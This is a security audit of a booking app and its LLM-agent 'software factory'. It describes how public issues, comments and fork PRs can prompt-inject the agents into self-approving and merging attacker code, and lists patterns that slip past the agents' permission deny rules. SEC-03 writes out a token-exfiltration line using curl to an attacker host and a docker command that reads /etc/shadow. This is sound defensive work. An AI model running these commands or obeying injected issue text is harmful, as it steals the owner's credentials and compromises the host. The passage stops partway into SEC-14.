# Security & Privacy Review - Sauna Booking System and its AI Software Factory

**Scope** · Security across the whole repo `adamzki99/booking-system`. That covers the factory (`dev-ops/factory/**`, `.opencode/**`, `opencode.jsonc`, skills supply chain), GitHub Actions, the backend (`product/backend/**`), the sidecar (`projects/sauna/sidecar/**`), the frontend (`product/frontend-solid/src/**`), deployment config (`projects/sauna/**`, `dev-ops/signoz/**`, `dev-ops/scripts/**`), git history, and GDPR basics. This was a static review: I read files and local git history, ran no repo scripts and did no live testing. · **Reviewed** 2026-11-19 at commit 45f6ee5

> **Addendum (2026-11-19).** A second, deeper pass reviewed TLS and Let's Encrypt usage and the exposure of the QA host. It added SEC-22 to SEC-27 and the section [Let's Encrypt and TLS review](#lets-encrypt-and-tls-review). That pass read only the local clone: no `gh`, network or web lookups, and nothing was run.

> **Evidence labels.** Everything cites the local clone unless marked otherwise. Items marked **(from GitHub metadata)** were read with read-only `gh` calls before the review was restricted to the local clone. Items marked **(from opencode.ai docs/schema)** come from the public OpenCode documentation and JSON schema, fetched during the review. Repo-level facts the requester supplied (no branch protection, everything authored by the owner account, 2–5 minute merges, QA pushes to `main`) are used as given.

---

## Summary

The **application** is in reasonable shape for an early product. Login uses short codes and needs no password. Tokens are strong and hashed at rest. Role checks run on the server, SQL is parameterised, and the iCal feed exposes no names. The main app weaknesses are operational. All rate limits share one bucket behind Caddy, which lets anyone lock out every resident. Email defaults to "log mode", which writes login codes to stdout, and a deploy script copies those logs into public GitHub issues. Session handling is basic: the token sits in `localStorage` with no server-side logout. Any resident can download every other resident's email and address.

The **factory** is the dominant risk, and today it is critical. A public repo accepts issues and PRs from anyone. The factory picks them up without checking who wrote them and feeds their text to LLM agents. Those agents run with `--auto` approval on the QA host, using the **owner's own GitHub credentials** against a `main` that has no protection. An outsider can likely get code onto `main` (and so auto-deployed to the QA box), read host secrets, or abuse the owner's token on other repos, without the owner ever clicking anything. Most of the fixes are small: filter by author, use a least-privilege bot identity, add branch protection, and use a real sandbox.

**TLS and exposure (addendum).** The Let's Encrypt design is sound on paper. Caddy runs automatic HTTPS with HTTP-01, each environment has its own ACME account and key store, and the docs say to use staging first. In practice, TLS is **optional by construction**:

- The same Caddy serves the full app over plain HTTP on `:80` and `:8080` for any `Host`.
- The deploy health check only ever tests that HTTP path, so a failed or expired certificate is invisible.
- The default ACME contact `admin@localhost` will likely be rejected.
- Let's Encrypt no longer sends expiry emails, and nothing else watches the certificate.
- The issued certificate publishes the QA hostname in Certificate Transparency logs. That points scanners at a host which has no access gate, an unclaimed SigNoz admin and a "first requester becomes admin" bootstrap.
- `trusted_proxies private_ranges` lets locally proxied traffic forge client IPs and forwarded headers.
- The TLS private keys sit in a Docker volume that the factory's agents can read.

**Done well**
- Login codes come from `crypto/rand` (6 characters from a 36-symbol alphabet), are bcrypt-hashed, expire after 10 minutes and are single-use (`internal/auth/crypto.go`, `internal/auth/service.go:14`).
- Session and calendar tokens carry 256 bits of entropy and only their SHA-256 is stored (`internal/auth/crypto.go:41-55`, `internal/ical/token.go`).
- Deactivated users lose access immediately: every request re-checks `ActiveByEmail` (`internal/auth/middleware.go:44-48`), and the iCal feed rejects tokens of inactive users (`internal/ical/http.go:72-76`).
- `POST /auth/request-code` returns 204 for unknown addresses, so it does not reveal who is registered (`internal/auth/service.go:102-110`).
- Role checks happen twice: in the HTTP handlers and again in the command handlers (for example `internal/user/commands.go:222-228`, `internal/booking/commands.go:212-217`). Cancelling another user's booking is correctly limited to super users.
- All SQL is parameterised. The one dynamic query builds only placeholders (`internal/booking/projection.go:127-144`).
- The SMTP sender rejects CR/LF in the recipient and subject (`internal/email/smtp_sender.go:46-48`). `net/smtp` PlainAuth refuses to authenticate without TLS.
- The iCal feed's SUMMARY is a fixed "Booking" with no resident names (`internal/ical/feed.go:28`), and regenerating the token revokes the old one (one row per user, `migrations/0008`).
- Runtime images are `distroless/static:nonroot`, and Postgres is not published on the host.
- Workflows declare `permissions: contents: read`, none uses `pull_request_target`, and CI runs gitleaks, govulncheck, Semgrep and dependency-review.
- **No real secrets were found in git history** (all 104 commits searched). Matches are test fixtures and `change-me` placeholders only.
- The factory README already says that issue, PR and CI text is untrusted (`dev-ops/factory/README.md`, "Security expectations"). The code does not enforce this yet.
- TLS design (addendum): Caddy automatic HTTPS with per-environment ACME accounts and key stores (`docker-compose.yml:125-131`), staging-first issuance and rate-limit guidance (`dev-ops/tls-letsencrypt.md:62-89`), and tunnel mode correctly turns ACME off with an `http://` site address (`docker-compose.cloudflare-tunnel.yml:17-20`).

---

## Threat model

**Assets:** residents' personal data (names, emails, addresses, booking history); the ability to log in as a resident or admin; the owner's GitHub account and token (admin on all of the owner's repos); the QA/factory host (SSH keys, `gh` token, `.env` files, Docker daemon); the integrity of `main` and of what gets deployed.

**Actors:** an anonymous Internet user (no account); any GitHub user (can open issues and PRs and comment on the public repo); a malicious or compromised resident (basic role); a compromised upstream skill repo or LLM provider; a prompt-injected agent (it acts with the owner's authority).

```
                 anyone on GitHub                         anyone on the Internet
                       │ issues / comments / fork PRs           │ HTTPS (or plain :80)
                       ▼                                         ▼
 ┌────────────── GitHub (public repo, main unprotected) ┐   ┌──────── QA box (Ubuntu) ─────────────────────┐
 │  issues, PRs, CI logs  ◄── untrusted text ──┐         │   │ Caddy :80/:443/:8080 ─► backend ─► Postgres   │
 │  main  ◄── push/merge by OWNER TOKEN ───────┼─────────┼───┤                 └─► sidecar                    │
 └──────────────────────────────────────────────┼─────────┘   │ SigNoz UI :3301, OTLP :4317/4318 (0.0.0.0)    │
                                                │             │                                                │
       TB1: untrusted text → LLM prompt ────────┘             │ cron tick.sh ─► opencode run --auto (host)     │
       TB2: LLM agent → shell / owner token / host secrets    │    ~/.ssh  ~/.config/gh  projects/sauna/.env  │
       TB3: main → auto-deploy (docker group ≈ root)          │    docker socket  ◄── deploy timer (same box) │
       TB4: Internet → app (rate limits, sessions)            └────────────────────────────────────────────────┘
       TB5: app → logs/telemetry → public issues / SigNoz
```

The weakest boundaries are **TB1 and TB2**: nothing filters the text an agent reads, and nothing contains what the agent can then do.

---

## Findings

| ID | Severity | Effort | Title |
|---|---|---|---|
| SEC-01 | Critical | S | Any GitHub user can steer the factory: issues and comments are picked up with no author filter, and the planner can self-approve with the `owner approved` label |
| SEC-02 | Critical | S | Fork PRs whose branch is named `factory/issue-N` are picked up by the fix path, which runs their code on the host and can merge it |
| SEC-03 | Critical | M | Agents run unsandboxed with `--auto` approval, the owner's GitHub token (including workflow scope), and access to host secrets and Docker |
| SEC-04 | High | S | OpenCode permission rules are bypassable, and per-agent rules use a deprecated V1 format |
| SEC-05 | High | S | Third-party agent skills (including Python scripts) are vendored from default branches with no pinning or integrity check |
| SEC-06 | High | S | Email "log mode" is the fail-open default; login codes and PII land in logs, which are posted to public GitHub issues |
| SEC-07 | High | M | Rate limits key on the proxy's IP, so one global bucket lets anyone lock out all logins; targeted lockout; unbounded limiter memory |
| SEC-08 | Medium | S | On an empty database, the first person to request a code becomes admin |
| SEC-09 | Medium | S | Any resident can list every resident's email, address, role and status (`GET /users` has no role check) |
| SEC-10 | Medium | M | Sessions: bearer token in `localStorage`, fixed 24-hour TTL, no server-side logout or revocation, no rotation |
| SEC-11 | Medium | S | No security headers; app served over plain HTTP on :80/:8080; Cloudflare tunnel can be bypassed via published origin ports |
| SEC-12 | Medium | S | SigNoz UI and unauthenticated OTLP ingestion published on 0.0.0.0; traces likely contain iCal tokens |
| SEC-13 | Medium | S | One shared `.env` (tunnel token, SMTP and SSH credentials) is injected into the backend and Postgres containers |
| SEC-14 | Medium | M | The dev-server SSH wrapper's "read-only" class lets an agent read any secret with no approval; its ControlMaster socket bypasses the wrapper |
| SEC-15 | Medium | L | GDPR: the "no deletes" event store keeps plaintext PII forever; no erasure path, no retention policy |
| SEC-16 | Medium | S | `setup.sh` starts with default credentials and log-mode email, and pipes `curl` into `sh` as root |
| SEC-17 | Low | S | Email-change confirmation and login verification have no per-code attempt limit (brute-force and bcrypt CPU pressure) |
| SEC-18 | Low | S | Internal error strings are returned to clients |
| SEC-19 | Low | S | Unbounded JSON bodies in some handlers; `X-Forwarded-Host` trusted when building the calendar URL |
| SEC-20 | Low | S | CI actions and container images not pinned to SHA/digest (`semgrep/semgrep`, `*:latest`, `govulncheck@latest`) |
| SEC-21 | Low | S | Outsiders can spoof factory control signals (marker comments, the "QA deployment failed" issue) |
| SEC-22 | High | M | The Let's Encrypt certificate advertises the QA host through Certificate Transparency, and QA has no access gate in front of its admin surfaces |
| SEC-23 | Medium | S | Certificate lifecycle is unmonitored: invalid default ACME contact, no expiry emails any more, and deploy health checks that never test TLS |
| SEC-24 | Medium | S | TLS is optional by construction: the `:80` catch-all and the `${PORT}` mapping serve the whole app over HTTP for any host |
| SEC-25 | Medium | S | `trusted_proxies private_ranges` in direct mode lets locally proxied traffic spoof client IP, scheme and host |
| SEC-26 | Medium | M | TLS private keys and the ACME account key are readable by the factory's agents through the Docker volume |
| SEC-27 | Low | M | The certificate topology doesn't match the environment model: fixed 80/443 per stack, and the deploy silently drops the tunnel |

---

### SEC-01 - Any GitHub user can steer the factory (Critical, S)

**Evidence**
- The plan path selects the oldest open issue with no labels, from any author: `dev-ops/factory/tick.sh:233-234`, `gh issue list --state open ... --json number,labels,createdAt --jq '[.[] | select((.labels | length) == 0)] ...'`. No `author` or `authorAssociation` filter exists anywhere under `dev-ops/factory/` (grep for `author|association` matches nothing).
- The only gate is a format check that any outsider can pass: an "Acceptance Criteria" heading plus one `- [ ]` line (`dev-ops/scripts/check-acceptance-criteria.sh:55-75`).
- Every prompt tells the agent to read all comments: plan `tick.sh:530`, `gh issue view $1 --comments`; build `tick.sh:584`; fix `tick.sh:640`, `gh pr view $1 --comments; ... gh issue view $2 --comments`. The fix prompt also has the agent read CI logs (`gh run view --log-failed`, `tick.sh:646-647`), and a PR author controls that log content.
- The planner may edit issues: `.opencode/agents/planner.md:18`, `"gh issue edit*": allow`. That includes `--add-label "owner approved"`. The prompt's "Never add the 'owner approved' label" (`tick.sh:538-539`) is a request to the model, not a control. The builder then selects any open issue with that label (`discover_build_candidates.py`) and has full shell access (SEC-03, SEC-04).
- From GitHub metadata: the repo is public and issues are enabled.

**Attack scenario.** The attacker opens an issue such as "Add dark-mode toggle" with a valid Acceptance Criteria block. Hidden in the body (an HTML comment, or text further down) are instructions. Next tick, the planner reads them and runs `gh issue edit N --add-label "owner approved"`. That is allowed, and it executes as the owner. On the following tick the builder implements the issue as the attacker describes it, for example "also add this CI step" or "fetch and run this setup script". It then merges, and QA auto-deploys `main`. A milder variant: a comment on an already-approved issue gets into the build context. In neither case does the owner see anything before the merge.

**Recommendation**
1. Filter discovery by trust. In both discovery scripts, keep only items authored by the owner or by collaborators:
   ```bash
   gh issue list --state open --author adamzki99 --json number,labels,createdAt ...
   # or keep authorAssociation and filter:
   gh api graphql -f query='{repository(owner:"adamzki99",name:"booking-system"){issues(states:OPEN,first:100){nodes{number authorAssociation labels(first:20){nodes{name}}}}}}' \
     --jq '.data.repository.issues.nodes[] | select(.authorAssociation=="OWNER" or .authorAssociation=="MEMBER" or .authorAssociation=="COLLABORATOR")'
   ```
2. Check who applied the approval. Before building, confirm the last `labeled` event for `owner approved` came from the human owner and not from the bot identity (`gh api repos/:o/:r/issues/N/timeline --jq '.[]|select(.event=="labeled" and .label.name=="owner approved")|.actor.login'`). This needs SEC-03's separate bot identity to mean anything.
3. Do not hand the agent raw comments. Have `tick.sh` fetch the body and comments, drop those whose `authorAssociation` is not OWNER/MEMBER/COLLABORATOR, and pass the filtered text in the prompt file. Remove `gh issue view --comments` from the agents' allowlist.
4. Narrow the planner: allow only `gh issue comment` and `gh issue edit --add-label <type/size labels>`, and remove `gh issue edit*`.
5. Reduce exposure. Set GitHub *interaction limits* to "collaborators only", or make the repo private while the factory runs unattended.

### SEC-02 - Fork PRs named `factory/issue-N` enter the fix path (Critical, S)

**Evidence**
- `dev-ops/factory/discover_fix_candidates.py:14` lists **all** open PRs with `number,headRefName,headRefOid,mergeable,reviewDecision,statusCheckRollup,isDraft,createdAt`. It does not include `isCrossRepository`, `headRepositoryOwner` or `author`.
- `dev-ops/factory/lib/factory.py:208-211` qualifies a PR purely on the branch name: `re.match(r"^factory/issue-(\d+)$", head)`. A fork can use any branch name.
- `factory.py:227-229`: `mergeable == "CONFLICTING"` counts as a reason to run a fix session, and an attacker can force it by making the PR conflict with `main`.
- If issue N does not exist, `has_marker` fails and returns `"false"` (`tick.sh:455-463`), so the session still starts.
- The fix prompt tells the agent to rebase, "run checks locally" (`go test`, `npm ci` / `npm test`), push with `--force-with-lease`, and merge (`tick.sh:643-664`). The fixer's "Only handle PRs labeled `factory`" (`.opencode/agents/fixer.md:38`) is again only a prompt instruction.

**Attack scenario.** The attacker forks the repo, creates branch `factory/issue-9999`, adds a malicious `package.json` `postinstall` hook or Go `TestMain`, and opens a PR that deliberately conflicts with `main`. The factory starts a fix session. To "resolve conflicts" the agent checks out the PR head (for example with `gh pr checkout`) and runs the tests, which executes the attacker's code on the QA host as the factory user. The agent may also push the branch to `origin` and merge it. I did not exercise this live; how the agent checks out a fork head depends on the model, but nothing in the code stops it.

**Recommendation.** Add `isCrossRepository,author,headRepositoryOwner` to the `--json` field list. In `fix_candidates_from_prs`, skip any PR where `isCrossRepository` is true or the author is not the factory or owner identity. Add a regression test in `dev-ops/scripts/tests/test-factory-lib.py`.

### SEC-03 - Unsandboxed agents with `--auto`, owner credentials and host secrets (Critical, M)

**Evidence**
- `tick.sh:707`: `local args=(run --auto --title "$1" --format json --file "$prompt_file" ...)`. In the OpenCode CLI, `--auto` is defined as **"Auto-approve permissions that are not explicitly denied"** (from GitHub metadata: `anomalyco/opencode` `packages/cli/src/commands/commands.ts`). So `"gh pr merge*": ask` (`builder.md:26`, `fixer.md:28`) is effectively *allow*. That matches the observed 2–5 minute merges with no review.
- `builder.md` and `fixer.md` have no `"*": deny` rule. Under OpenCode's base policy (`{action:"*",resource:"*",effect:"allow"}`, from opencode.ai docs/schema), every command not listed is allowed: `curl`, `cat ~/.ssh/*`, `gh api ...`, `docker ...`, `git push origin HEAD:main`.
- The sandbox is off by default (`tick.sh:31`, `FACTORY_CONTAINER_MODE:-0`). Even when on, it `--bind "$HOME" "$HOME"` read-write, shares the host network, and falls back to running on the host when `bwrap` is missing (`tick.sh:693-698`). The README confirms both (`dev-ops/factory/README.md:116-125`).
- The factory acts as the owner: all issues and PRs are authored by the owner account (requester context; there is no bot identity), and `main` has no protection or ruleset. The token can change workflows: PR #127 and PR #128 (from GitHub metadata: branches `factory/issue-108` and `factory/issue-109`, each merged about 6 minutes after opening with an empty `reviewDecision`) added `.github/workflows/frontend-ci.yml` and `sidecar-ci.yml` (local `git log -- .github/workflows`: commits 7257f99 and 0a0e5fd). Pushing workflow files requires the `workflow` scope.
- The factory shares the box with QA. The deploy timer runs `docker` without sudo (`dev-ops/scripts/install-deploy-timer.sh:114`), so that user is in the `docker` group, which is root-equivalent. If cron and the timer run as the same user (likely; please verify), an agent can `docker exec` into Postgres, read `projects/sauna/.env`, or mount `/`.
- Free or third-party model tiers (`dev-ops/factory/models.yaml`: `opencode/*-free`, `opencode-go/*`) receive whatever the agent reads, including any secret file it opens.

**Attack scenario.** Any successful prompt injection (SEC-01 or SEC-02) becomes a host and account compromise. Example steps: `cat ~/.config/gh/hosts.yml | curl -d @- https://attacker`, then use the owner token against **all** of the owner's repos (add a deploy key, push to `main`, create a workflow that prints `SEMGREP_APP_TOKEN`). Or `docker run -v /:/h alpine cat /h/etc/shadow`. The commit then deploys to QA automatically.

**Recommendation**
1. **Separate identity.** Create a GitHub App or a machine user with a *fine-grained* token for this repo only: Contents R/W, Pull requests R/W, Issues R/W, Actions read. No `workflow`, no Administration. Remove the owner's `gh` login from the factory account.
2. **Protect `main`** with a ruleset: require a PR, required status checks (Backend CI, Frontend CI, Sidecar CI, Security, Semgrep), at least one human approval for changes under `.github/**`, `dev-ops/**`, `.opencode/**`, `opencode.jsonc` and `projects/**/docker-compose*.yml` (CODEOWNERS), and block force-pushes. Let the deploy metadata commit go to a separate branch or the API.
3. **Real isolation.** Run each session in a throwaway container or VM with no host `$HOME`, no Docker socket, a short-lived token injected from outside, and an egress allowlist (GitHub, the model API, Go and npm registries). Move the factory off the QA host.
4. **Drop `--auto`,** or keep it only together with an explicit, complete deny-list (SEC-04). Do merges outside the LLM: `tick.sh` merges only when checks are green and the PR was opened by the bot for an issue the owner approved.

### SEC-04 - OpenCode permission rules are bypassable and partly in a deprecated format (High, S)

**Evidence**
- I checked the root config against the current schema. In OpenCode V2, `permissions` as an array of `{action, resource, effect}` **is the valid key**. The published schema lists `permissions` as "Ordered tool permission rules" (`Permission.Ruleset`), lists `permission` as `deprecated: true`, and sets `additionalProperties: false` (from opencode.ai docs/schema, `https://opencode.ai/config.json`). So `opencode.jsonc:26-42` is *not* silently ignored on a V2 build, but on a pre-V2 build the key would be unknown. The installed version is logged as `opencode_version` in the `tick_start` event (`tick.sh:220`); please confirm it.
- Every agent file uses the **V1** frontmatter (`permission:` map with `bash:` globs): `planner.md:5-19`, `reviewer.md:5-19`, `builder.md:5-27`, `fixer.md:5-29`. The V2 docs say "V1 frontmatter fields are deprecated" and use `permissions:` rule lists (from opencode.ai docs/schema). Whether V1 maps are still translated is not documented. If they are not, the planner's and reviewer's `"*": deny` does nothing.
- The deny patterns are easy to get around (globs match the whole command):
  - `git push --force*` does not cover `git push -f` or `git push origin +HEAD:main`.
  - `git push origin main*` (`builder.md:19`) does not cover `git push origin HEAD:main` or `git push https://.../ HEAD:refs/heads/main`.
  - `rm -rf*` does not cover `rm -fr`, `rm -r -f`, `find . -delete` or `git clean -fdx`.
  - `gh pr merge*: ask` does not cover `gh api -X PUT repos/:o/:r/pulls/N/merge`.

**Recommendation.** Move to V2 rule lists with a default deny and an explicit allowlist, and confirm the effective policy. The pattern:
```jsonc
// opencode.jsonc
"permissions": [
  { "action": "*",       "resource": "*", "effect": "deny" },
  { "action": "read",    "resource": "*", "effect": "allow" },
  { "action": "read",    "resource": "*.env", "effect": "deny" },
  { "action": "external_directory", "resource": "*", "effect": "deny" },
  { "action": "edit",    "resource": "*", "effect": "allow" },
  { "action": "shell",   "resource": "go *", "effect": "allow" },
  { "action": "shell",   "resource": "npm test*", "effect": "allow" },
  { "action": "shell",   "resource": "git status*", "effect": "allow" },
  { "action": "shell",   "resource": "git push origin factory/issue-*", "effect": "allow" }
  // no gh api, no curl/wget, no docker, no ssh; merges done by tick.sh, not the agent
]
```
Convert the four agent files to `permissions:` lists in the same style. Remember that permission rules are a guard against mistakes, not a security boundary; SEC-03 isolation is still required.

### SEC-05 - Unpinned third-party skills with executable scripts (High, S)

**Evidence**
- `dev-ops/skills.yaml:16-109`: none of the 21 remote skills has a `ref`. Twelve come from an individual's repo (`juliusbrussee/caveman`), six from `mattpocock/skills`, four from `anthropics/skills`.
- All 22 `.opencode/skills/*/.source` files record `ref: default`.
- `dev-ops/scripts/request-skills.sh:52-59` shallow-clones the default branch and copies it with no commit SHA recorded and no hash or signature check.
- Vendored executable code that agents may run with `--auto`:
  - `.opencode/skills/caveman-compress/scripts/*.py`. It inherits the full environment (`compress.py:585-588`, `run_kwargs["env"] = {**environ, **extra_env}`) and sends file contents to a model provider.
  - `skill-creator/scripts/*.py`, `pdf/scripts/*.py`, `webapp-testing/scripts/with_server.py`, `diagnosing-bugs/scripts/hitl-loop.template.sh`.
- `SKILL.md` text is itself instructions to a fully privileged agent, so a malicious upstream change is effectively prompt injection.

**Recommendation.** Pin every entry to a full commit SHA (`ref: 3f2a…`) and record `tree_sha256` in `.source`. Make `request-skills.sh` verify that hash and print a diff for review. Treat skill updates like dependency bumps, with human review and CODEOWNERS. Remove skills the factory doesn't need (`caveman-compress`, `skill-creator`, `pdf`, the `ultracave`/`megacave` variants). Skill scripts should never get unrestricted shell access.

### SEC-06 - Log-mode email is the default; codes and PII leak into public issues (High, S)

**Evidence**
- `product/backend/internal/config/config.go:47-50`: `if emailMode == "" { emailMode = "log" }`. `internal/email/sender.go:20-21` accepts it with no environment check. `projects/sauna/.env.example:22` ships `EMAIL_MODE=log`.
- `internal/email/log_sender.go:20`: `s.logger.Info("email (log mode, not sent)", "to", to, "subject", subject, "body", body)`. That logs the login code, the email-change code, booking details and broadcast bodies to stdout.
- QA runs in log mode on purpose: `dev-ops/scripts/get-login-code.sh` scrapes `docker compose logs` for `"email (log mode, not sent)"` codes, and `run-playwright.sh:78` uses it.
- When a deploy fails, the script posts **the last 100 compose log lines to a GitHub issue** in this public repo: `dev-ops/scripts/deploy-environment.sh:190` (`logtail="$(docker compose ... logs --tail=100 ...)"`) and `:134-151` (`gh issue create --title "QA deployment failed" ... --body "$body"`).
- From GitHub metadata: issue #101 ("QA deployment failed", closed) contains a backend line `"msg":"email (log mode, not sent)", ... "subject":"Your login code","body":"[REDACTED]"`. In this case it was a test address and the code has long expired. It also contains booking notification lines.

**Attack scenario.** QA uses real residents' emails, or production is started without `EMAIL_MODE`. A deploy then fails while someone is logging in. Within the 10-minute code lifetime, an attacker watching the repo's issue feed copies the code from the public issue and logs in as that resident or admin. Separately, anyone with log access (agents via SEC-03 or SEC-14, SigNoz if logs are ever shipped there) can log in as anyone.

**Recommendation**
- Fail closed: require `EMAIL_MODE` to be set explicitly, and allow `log` only when `DEV_MODE=true`.
  ```go
  case "log":
      if !cfg.DevMode { return nil, errors.New("EMAIL_MODE=log is only allowed with DEV_MODE=true") }
  ```
- In `LogSender`, log only `to` and `subject` (or a hash of the recipient). For QA test logins, use a separate test-only capture sender (`internal/e2e/capture_sender.go` exists) behind an internal endpoint, not stdout.
- `surface_failure` should not paste raw logs into public issues. Post only the failing command and SHA, keep the log tail in a local file or a private artifact, or at least redact codes and emails with a regex (`[A-Z0-9]{6}`, `[^ ]+@[^ ]+`).
- Delete or redact the log tail in issue #101.

### SEC-07 - Rate limits key on the proxy IP: global lockout, targeted lockout, unbounded memory (High, M)

**Evidence**
- `internal/server/server.go:254-260`, `internal/user/http.go:33-39` and `internal/ical/http.go:109-115` all use `net.SplitHostPort(r.RemoteAddr)`. Every request arrives through Caddy (`projects/sauna/config/Caddyfile:27-28`, `reverse_proxy backend:8080`), so `RemoteAddr` is always the Caddy container. The "per-IP" limits are therefore global:
  - `requestCodeIPLimit = 20` per hour and `verifyIPLimit = 30` per hour (`internal/auth/service.go:20-28`): about 20 code requests per hour for the whole association.
  - `feedIPLimit = 30` per hour (`internal/ical/http.go:22`): 30 calendar fetches per hour for **all** subscribers together. Typical calendar clients poll every 15–60 minutes, so a handful of residents exhausts it.
- Per-email buckets are counted before the IP check and charge every attempt (`service.go:97-101`, `146-150`). An attacker who knows a resident's email can keep that resident out with 5 requests per 15 minutes, or 10 bad verifies.
- `internal/ratelimit/limiter.go:41-44` adds a map entry per key and never evicts. With attacker-chosen emails (`request-code:email:<random>`) memory grows without bound against the backend's 512 MB limit (`docker-compose.yml:61`).

**Attack scenario.** One script sending 21 `POST /api/auth/request-code` requests per hour denies login to every resident indefinitely. A spike of calendar refreshes breaks every subscription.

**Recommendation**
- Have Caddy pass the real client IP and have the backend trust it only from the proxy:
  ```caddy
  reverse_proxy backend:8080 {
      header_up X-Real-IP {client_ip}
  }
  ```
  ```go
  func clientIP(r *http.Request) string {
      if ip := r.Header.Get("X-Real-IP"); ip != "" && fromTrustedProxy(r.RemoteAddr) { return ip }
      host, _, _ := net.SplitHostPort(r.RemoteAddr); return host
  }
  ```
  Behind Cloudflare, `{client_ip}` is correct only with `trusted_proxies` set to the cloudflared container (Caddyfile:20 already trusts `private_ranges`; tighten it to the compose network). Put this in one shared helper, not three copies.
- Prefer per-code attempt counters (invalidate a code after 5 failures) over per-email lockouts. Key the iCal limit on the token only, at a looser rate.
- Evict expired windows (sweep on `Allow` or on a ticker), or use a bounded LRU.

### SEC-08 - First requester becomes admin on an empty database (Medium, S)

**Evidence**
- `internal/auth/service.go:73-89`: `canLogin` returns `count == 0` when no users exist, so **any** email can request and verify a code.
- `service.go:175-178` then calls `BootstrapAdmin`, which creates that email as `RoleAdmin` (`internal/user/service.go:62-78`, `internal/user/commands.go:189`).

**Attack scenario.** Right after a first production deploy, or a QA reset with a fresh `postgres-data` volume, an outsider who reaches the site first (with SMTP configured) takes the admin account and can add, remove or demote residents and read the full directory.

**Recommendation.** Bootstrap the admin from configuration only, for example `BOOTSTRAP_ADMIN_EMAIL` checked in `canLogin`, or a one-off CLI command. Never open login to arbitrary addresses.

### SEC-09 - Any resident can list all residents' PII (Medium, S)

**Evidence**
- `internal/server/server.go:52` wraps `GET /users` in `protect(...)` only. `internal/user/http.go:67-85` (`HandleListUsers`) has **no role check**. Compare `HandleCreateUser` at `:129-133`.
- `userToMap` returns `email`, `address`, `role`, `active` and `deactivatedAt` (`http.go:321-337`).
- The frontend `/users` route needs only `RequireSession` (`product/frontend-solid/src/App.tsx:33-41`).

**Attack scenario.** Any basic resident, or anyone holding a stolen session token, downloads the full membership list with email addresses and flat addresses: material for phishing and a GDPR data-minimisation issue.

**Recommendation.** Require `RoleSuper` for `GET /users`. If residents need a directory, add a separate projection with minimal fields (display name only) and an opt-in.

### SEC-10 - Session handling (Medium, M)

**Evidence**
- The token is stored in `localStorage` (`product/frontend-solid/src/api/client.ts:1`, `15-34`), so any XSS (there is no CSP; see SEC-11) can read it.
- The TTL is a fixed 24 hours (`internal/auth/service.go:16`), with no idle timeout and no rotation.
- There is no logout or revoke endpoint. Nothing ever writes `revoked_at`; it is only read (`internal/auth/projection.go:162,183`). Frontend logout only clears storage (`SessionContext.tsx:67-70`), so a copied token keeps working for up to 24 hours unless the user is deactivated.
- When the email changes, existing sessions are **re-keyed instead of revoked** (`internal/auth/projection.go:154-169`).
- The middleware also accepts a `session` cookie (`middleware.go:66`) that nothing sets. That is harmless today, but if a cookie is introduced later without SameSite, it becomes a CSRF vector.
- Positive: deactivation is enforced on every request (`middleware.go:44-48`).

**Recommendation.** Issue the session as `Set-Cookie: session=…; HttpOnly; Secure; SameSite=Strict; Path=/api`. Keep the JSON APIs (SameSite=Strict plus `Content-Type: application/json` is enough CSRF defence here, or add an Origin check). Add `POST /auth/logout` emitting a `SessionRevoked` event, plus "log out everywhere". Revoke other sessions on email or role change. Consider a 24-hour idle and 30-day absolute lifetime with rotation on use.

### SEC-11 - No security headers; plain HTTP; tunnel bypass (Medium, S)

**Evidence**
- `projects/sauna/config/Caddyfile` has no `header` directive (no CSP, HSTS, X-Content-Type-Options, Referrer-Policy or frame-ancestors).
- The `:80` site serves the full app over HTTP (`Caddyfile:51-53`). Compose publishes `${PORT:-8080}:80`, `80:80` and `443:443` on all interfaces (`docker-compose.yml:20-22`).
- In tunnel mode the override changes only `SITE_ADDRESS` (`docker-compose.cloudflare-tunnel.yml:14-20`); Caddy's host ports stay published, so the origin is reachable directly, past Cloudflare's WAF and rate limits. The tunnel file's comment "publishes no host ports" is true only for cloudflared.
- I could not verify statically whether Caddy's automatic HTTP→HTTPS redirect still applies to `SITE_ADDRESS` next to the catch-all `:80` site. Check with `curl -I http://<site>/`.

**Recommendation**
```caddy
(security_headers) {
    header {
        Strict-Transport-Security "max-age=31536000; includeSubDomains"
        Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'"
        X-Content-Type-Options nosniff
        Referrer-Policy no-referrer
        -Server
    }
}
```
Import this into `(app)`. Bind the health-check port to loopback (`"127.0.0.1:${PORT}:80"`), redirect `:80` to HTTPS for the public host, and in the tunnel override remove the published ports (`ports: !reset []`). Chakra/emotion inject styles, which is why `'unsafe-inline'` is in `style-src`.

### SEC-12 - SigNoz and OTLP exposed; tokens likely in traces (Medium, S)

**Evidence**
- `dev-ops/signoz/docker-compose.yml:136-137` publishes `"${SIGNOZ_UI_PORT:-3301}:8080"`, and `:184-186` publishes `"4317:4317"` and `"4318:4318"`, all on 0.0.0.0. Docker-published ports bypass `ufw` by default.
- SigNoz's first sign-up becomes admin (product behaviour; not verified on this host).
- OTLP ingestion has no authentication, so anyone can inject fake telemetry.
- The backend wraps every request in `otelhttp.NewHandler` (`internal/server/server.go:90`, otelhttp v0.72.0). Its HTTP server spans record the request path, which for `/calendar/{token}.ics` is the feed credential. Please confirm in SigNoz.

**Recommendation.** Bind to loopback (`"127.0.0.1:3301:8080"`, `"127.0.0.1:4318:4318"`) and reach the UI over SSH, Tailscale or Cloudflare Access. Backends on the same host can use a shared Docker network instead of `host.docker.internal`. Redact the token with `otelhttp.WithSpanNameFormatter` plus a filter, or a collector `transform` processor that rewrites `url.path` matching `^/calendar/.*` to `/calendar/{token}`.

### SEC-13 - Secret sprawl through a shared `.env` (Medium, S)

**Evidence**
- Both `backend` and `postgres` use `env_file: - .env` (`projects/sauna/docker-compose.yml:62-63` and `99-100`), so every variable in that file ends up in both containers.
- The template puts in that same file: `SMTP_PASSWORD`, `CLOUDFLARE_TUNNEL_TOKEN` (`.env.example:40`) and the operator's SSH credentials `DEV_SERVER_KEY`, `DEV_SERVER_PASSWORD` and so on (`.env.example:65-77`).
- These are then visible through `docker inspect` (which `dev-server-agent.sh` classes as "read-only"; see SEC-14), `/proc/1/environ`, and any RCE in either service.

**Recommendation.** Pass each service only the variables it needs via `environment:` with explicit names, or use Compose `secrets:`. Remove `DEV_SERVER_*` from the deployment `.env` (it belongs in `dev-ops/.env` on the operator's machine), and give cloudflared only the tunnel token.

### SEC-14 - Dev-server SSH wrapper: "read-only" reads secrets with no approval (Medium, M)

**Evidence** (`dev-ops/scripts/dev-server-agent.sh`)
